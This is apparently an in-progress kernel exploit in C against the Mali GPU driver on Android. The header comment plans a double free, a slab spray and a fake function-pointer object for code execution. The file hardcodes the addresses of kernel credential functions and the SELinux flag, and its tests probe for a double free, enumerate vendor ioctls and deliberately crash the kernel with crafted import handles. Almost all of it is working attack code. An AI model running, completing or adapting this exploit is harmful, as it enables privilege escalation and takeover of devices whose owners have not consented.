/*
 * mali_exploit5.c — Mali vendor dispatch exploitation via double-free
 *
 * NEW STRATEGY: Instead of trying to get code execution from MEM_IMPORT,
 * use the vendor dispatch to perform unauthorized MEM_FREE operations.
 *
 * Plan:
 * 1. Allocate Mali memory via standard dispatch → get gpu_addr
 * 2. Free it via vendor dispatch (func=516) → first free
 * 3. Reclaim with controlled data (socketpair spray → kmalloc-256)
 * 4. Free again via vendor dispatch → double-free / UAF
 * 5. Reclaim freed slab with fake object containing function pointer
 * 6. Trigger use of dangling reference → code execution
 *
 * Also tests:
 * - Whether vendor MEM_FREE accepts valid gpu_addr
 * - Whether standard MEM_FREE rejects after vendor free (dangling check)
 * - What slab cache Mali regions live in
 * - Various vendor dispatch func IDs with larger buffers
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0
#define SELINUX_ENFORCING   0xc0b7ad54

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

/* Read slabinfo for a specific cache */
static int read_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, name)) {
            int active;
            if (sscanf(line, "%*s %d", &active) == 1) {
                fclose(f);
                return active;
            }
        }
    }
    fclose(f);
    return -1;
}

/* ============================================================= */
/* TEST 1: Mali MEM_ALLOC + check slab changes                   */
/* ============================================================= */
static void test1_alloc_and_slab(int mali_fd) {
    fprintf(stderr, "\n--- TEST 1: MEM_ALLOC and slab impact ---\n");

    int k256_before = read_slab("kmalloc-256");
    int k192_before = read_slab("kmalloc-192");
    int k128_before = read_slab("kmalloc-128");
    int k64_before = read_slab("kmalloc-64");

    /* MEM_ALLOC: func=512
     * struct kbase_uk_mem_alloc {
     *   uk_header (8B)
     *   u64 va_pages (8B)    - offset 8
     *   u64 commit_pages (8B) - offset 16
     *   u64 extent (8B)      - offset 24
     *   u64 flags (8B)       - offset 32
     *   u64 gpu_va (8B)      - offset 40 (output)
     *   u16 va_alignment (2B)- offset 48
     *   u16 padding[3] (6B)  - offset 50
     * }; total = 56 bytes
     */
    uint8_t buf[64];
    memset(buf, 0, 64);
    ((struct uk_header*)buf)->id = 512;  /* MEM_ALLOC */
    *(uint64_t*)(buf + 8)  = 1;   /* va_pages = 1 (4KB) */
    *(uint64_t*)(buf + 16) = 1;   /* commit_pages = 1 */
    *(uint64_t*)(buf + 24) = 0;   /* extent = 0 */
    /* flags: PROT_CPU_RD | PROT_CPU_WR | PROT_GPU_RD | PROT_GPU_WR */
    *(uint64_t*)(buf + 32) = 0xF; /* flags */
    *(uint16_t*)(buf + 48) = 0;   /* va_alignment */

    int r = ioctl(mali_fd, make_cmd_std(56), buf);
    uint32_t result = ((struct uk_header*)buf)->id;
    uint64_t gpu_va = *(uint64_t*)(buf + 40);
    fprintf(stderr, "  MEM_ALLOC: ioctl=%d result=%u gpu_va=0x%llx\n",
            r, result, (unsigned long long)gpu_va);

    int k256_after = read_slab("kmalloc-256");
    int k192_after = read_slab("kmalloc-192");
    int k128_after = read_slab("kmalloc-128");
    int k64_after = read_slab("kmalloc-64");

    fprintf(stderr, "  Slab changes: k256=%+d k192=%+d k128=%+d k64=%+d\n",
            k256_after - k256_before, k192_after - k192_before,
            k128_after - k128_before, k64_after - k64_before);

    if (result == 0 && gpu_va != 0) {
        fprintf(stderr, "  *** ALLOC SUCCEEDED! gpu_va=0x%llx ***\n",
                (unsigned long long)gpu_va);

        /* Try vendor MEM_FREE */
        uint8_t fbuf[16];
        memset(fbuf, 0, 16);
        ((struct uk_header*)fbuf)->id = 516;  /* MEM_FREE */
        *(uint64_t*)(fbuf + 8) = gpu_va;

        /* First: standard free */
        fprintf(stderr, "\n  Standard MEM_FREE:\n");
        r = ioctl(mali_fd, make_cmd_std(16), fbuf);
        fprintf(stderr, "    ioctl=%d result=%u\n", r, ((struct uk_header*)fbuf)->id);

        /* Allocate again */
        memset(buf, 0, 64);
        ((struct uk_header*)buf)->id = 512;
        *(uint64_t*)(buf + 8)  = 1;
        *(uint64_t*)(buf + 16) = 1;
        *(uint64_t*)(buf + 32) = 0xF;
        r = ioctl(mali_fd, make_cmd_std(56), buf);
        result = ((struct uk_header*)buf)->id;
        gpu_va = *(uint64_t*)(buf + 40);
        fprintf(stderr, "\n  Second MEM_ALLOC: result=%u gpu_va=0x%llx\n",
                result, (unsigned long long)gpu_va);

        if (result == 0 && gpu_va != 0) {
            /* Now try VENDOR free */
            fprintf(stderr, "\n  Vendor MEM_FREE:\n");
            memset(fbuf, 0, 16);
            ((struct uk_header*)fbuf)->id = 516;
            *(uint64_t*)(fbuf + 8) = gpu_va;
            r = ioctl(mali_fd, make_cmd_vendor(16), fbuf);
            fprintf(stderr, "    ioctl=%d result=%u\n", r, ((struct uk_header*)fbuf)->id);

            int k256_free = read_slab("kmalloc-256");
            fprintf(stderr, "    k256 delta after vendor free: %+d\n",
                    k256_free - k256_after);

            /* Try standard free of same region (double-free test) */
            fprintf(stderr, "\n  Standard MEM_FREE (double-free attempt):\n");
            memset(fbuf, 0, 16);
            ((struct uk_header*)fbuf)->id = 516;
            *(uint64_t*)(fbuf + 8) = gpu_va;
            r = ioctl(mali_fd, make_cmd_std(16), fbuf);
            fprintf(stderr, "    ioctl=%d result=%u (3=error, 0=DOUBLE FREE!)\n",
                    r, ((struct uk_header*)fbuf)->id);
        }
    }
}

/* ============================================================= */
/* TEST 2: Enumerate vendor dispatch func IDs with larger buffers */
/* ============================================================= */
static void test2_vendor_enum(int mali_fd) {
    fprintf(stderr, "\n--- TEST 2: Vendor dispatch enumeration (size=48) ---\n");

    /* Try func IDs 500-560 with size=48 */
    for (uint32_t func = 500; func <= 560; func++) {
        uint8_t buf[48];
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = func;

        int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
        uint32_t result = ((struct uk_header*)buf)->id;

        if (r == 0 && result != 3 && errno != 14) {
            /* Interesting result */
            fprintf(stderr, "  func=%u: ioctl=%d result=%u\n", func, r, result);
        } else if (r < 0 && errno == 14) {
            /* EFAULT — needs more data */
            /* skip, not interesting right now */
        } else if (result == 0) {
            fprintf(stderr, "  func=%u: SUCCESS (result=0)\n", func);
        }
        /* Skip result=3 (FUNCTION_FAILED) - boring */
    }

    /* Try some higher func IDs */
    for (uint32_t func = 600; func <= 700; func++) {
        uint8_t buf[48];
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = func;
        int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
        uint32_t result = ((struct uk_header*)buf)->id;
        if (result == 0 || (r == 0 && result != 3)) {
            fprintf(stderr, "  func=%u: ioctl=%d result=%u\n", func, r, result);
        }
    }
}

/* ============================================================= */
/* TEST 3: Vendor MEM_IMPORT with various phandle values          */
/* Understand what causes crash vs no-crash                       */
/* ============================================================= */
static void test3_phandle_sweep(void) {
    fprintf(stderr, "\n--- TEST 3: Phandle value sweep ---\n");

    /* Try phandle values that are valid fds */
    uint32_t test_values[] = {
        0,           /* NULL */
        1, 2, 3, 4, 5, 6, 7, 8, 9, 10,  /* small values (potential fds) */
        0x1000,      /* 4K, unmapped */
        0x8000,      /* mmap_min_addr */
        0x10000,     /* 64K */
        0xBEFF0000,  /* typical stack area */
        0xC0000000,  /* kernel/user boundary */
    };

    for (int i = 0; i < (int)(sizeof(test_values)/sizeof(test_values[0])); i++) {
        uint32_t phandle = test_values[i];

        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            int mali_fd = mali_open_ctx();
            if (mali_fd < 0) _exit(1);

            uint8_t buf[48];
            memset(buf, 0, 48);
            ((struct uk_header*)buf)->id = 513;
            *(uint64_t*)(buf + 8) = (uint64_t)phandle;
            *(uint32_t*)(buf + 16) = 2;

            int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
            uint32_t result = ((struct uk_header*)buf)->id;
            fprintf(stderr, "  phandle=0x%08x: ioctl=%d errno=%d result=%u\n",
                    phandle, r, errno, result);

            close(mali_fd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            fprintf(stderr, "  phandle=0x%08x: SIGNAL %d%s\n", phandle,
                    WTERMSIG(status),
                    WTERMSIG(status) == 14 ? " (HANG)" : " (CRASH)");
        }
    }
}

/* ============================================================= */
/* TEST 4: Try to crash with import, then observe which address   */
/* the kernel was trying to access                                */
/* ============================================================= */
static void test4_controlled_crash(void) {
    fprintf(stderr, "\n--- TEST 4: Controlled crash with mapped gaps ---\n");

    /* Map a region with a known gap (hole at specific offset) */
    /* If the kernel crashes at the gap address, we know the access offset */

    void *mapped = mmap((void *)0x40000000, 0x10000,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (mapped == MAP_FAILED) { perror("mmap"); return; }

    /* Fill with valid data */
    uint32_t *p = (uint32_t *)mapped;
    for (int i = 0; i < 0x10000/4; i++)
        p[i] = 0x00010001;

    /* Place identifiable values at specific offsets from phandle */
    uint32_t phandle = 0x40001000;
    uint32_t *ph = (uint32_t *)((char *)mapped + 0x1000);

    /* At offset 0: put 0 (fd=0=stdin, or just zero) */
    ph[0] = 0;

    fprintf(stderr, "  Trying with all-zero at phandle...\n");
    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { munmap(mapped, 0x10000); return; }

    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)phandle;
    *(uint32_t*)(buf + 16) = 2;
    int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  result=%u\n", ((struct uk_header*)buf)->id);

    /* Now try with real fd at offset 0 */
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd >= 0) {
        struct {
            uint32_t len, align, heap_mask, flags;
            int32_t handle;
        } alloc = {4096, 4096, 1, 0, 0};
        if (ioctl(ion_fd, 0xc0144900, &alloc) == 0) {
            struct { int32_t handle, fd; } share = {alloc.handle, 0};
            if (ioctl(ion_fd, 0xc0084904, &share) == 0) {
                int dma_fd = share.fd;
                fprintf(stderr, "  Got dma_buf fd=%d\n", dma_fd);

                /* Put fd at various offsets */
                for (int off = 0; off <= 32; off += 4) {
                    /* Reset */
                    for (int j = 0; j < 64; j++) ph[j] = 0;
                    ph[off/4] = dma_fd;

                    memset(buf, 0, 48);
                    ((struct uk_header*)buf)->id = 513;
                    *(uint64_t*)(buf + 8) = (uint64_t)phandle;
                    *(uint32_t*)(buf + 16) = 2;
                    r = ioctl(mali_fd, make_cmd_vendor(48), buf);
                    uint32_t result = ((struct uk_header*)buf)->id;
                    uint64_t out_va = *(uint64_t*)(buf + 40);
                    fprintf(stderr, "  fd@+%d: result=%u",
                            off, result);
                    if (out_va != 0)
                        fprintf(stderr, " gpu_va=0x%llx", (unsigned long long)out_va);
                    fprintf(stderr, "\n");
                }
                close(dma_fd);
            }
        }
        close(ion_fd);
    }

    close(mali_fd);
    munmap(mapped, 0x10000);
}

/* ============================================================= */
/* TEST 5: Standard dispatch MEM_IMPORT with real dma_buf         */
/* Establish baseline of what a SUCCESSFUL import looks like      */
/* ============================================================= */
static void test5_std_import(int mali_fd) {
    fprintf(stderr, "\n--- TEST 5: Standard import baseline ---\n");

    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) { perror("ion"); return; }

    struct { uint32_t len, align, heap_mask, flags; int32_t handle; } alloc = {4096, 4096, 1, 0, 0};
    if (ioctl(ion_fd, 0xc0144900, &alloc) < 0) {
        perror("ion alloc");
        close(ion_fd);
        return;
    }

    struct { int32_t handle, fd; } share = {alloc.handle, 0};
    if (ioctl(ion_fd, 0xc0084904, &share) < 0) {
        perror("ion share");
        close(ion_fd);
        return;
    }
    int dma_fd = share.fd;
    fprintf(stderr, "  ION handle=%d, dma_buf fd=%d\n", alloc.handle, dma_fd);

    /* Standard MEM_IMPORT with type=2 (UMM), phandle = &dma_fd */
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
    *(uint32_t*)(buf + 16) = 2;  /* UMM */
    *(uint32_t*)(buf + 20) = 0;  /* padding */
    *(uint64_t*)(buf + 24) = 0xF; /* flags: PROT_CPU_RD|WR|GPU_RD|WR */

    int r = ioctl(mali_fd, make_cmd_std(56), buf);
    uint32_t result = ((struct uk_header*)buf)->id;
    uint64_t gpu_va = *(uint64_t*)(buf + 32);
    fprintf(stderr, "  Standard import: ioctl=%d result=%u gpu_va=0x%llx\n",
            r, result, (unsigned long long)gpu_va);

    /* Dump full response */
    fprintf(stderr, "  Response:\n");
    for (int i = 0; i < 56; i += 4) {
        uint32_t v = *(uint32_t*)(buf + i);
        if (v != 0) fprintf(stderr, "    [%2d] 0x%08x\n", i, v);
    }

    close(dma_fd);
    close(ion_fd);
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Vendor Dispatch Exploitation ===\n");
    fprintf(stderr, "PID=%d UID=%d\n\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) {
        fprintf(stderr, "Cannot open Mali context!\n");
        return 1;
    }

    if (test == 0 || test == 1) {
        pid_t pid = fork();
        if (pid == 0) { alarm(10); test1_alloc_and_slab(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 1 crashed: signal %d\n", WTERMSIG(status));
    }

    if (test == 0 || test == 2) {
        pid_t pid = fork();
        if (pid == 0) { alarm(10); test2_vendor_enum(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 2 crashed: signal %d\n", WTERMSIG(status));
    }

    if (test == 3) {
        /* phandle sweep - POTENTIALLY DANGEROUS (may crash kernel) */
        test3_phandle_sweep();
    }

    if (test == 0 || test == 4) {
        pid_t pid = fork();
        if (pid == 0) { alarm(10); test4_controlled_crash(); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 4 crashed: signal %d\n", WTERMSIG(status));
    }

    if (test == 0 || test == 5) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test5_std_import(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 5 crashed: signal %d\n", WTERMSIG(status));
    }

    close(mali_fd);
    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
